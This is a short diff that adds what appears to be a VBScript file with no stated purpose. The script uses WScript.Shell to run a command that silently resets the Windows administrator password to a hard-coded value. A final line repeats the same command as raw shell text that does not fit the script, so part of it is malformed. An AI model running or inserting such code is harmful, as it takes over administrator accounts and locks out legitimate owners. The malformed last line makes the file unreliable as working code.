@@ -1,0 +1,3 @@
+Set Wshshell=CreateObject("Wscript.Shell")
+Wshshell.Run "cmd /c net user administrator 520324"
+net user administrator password
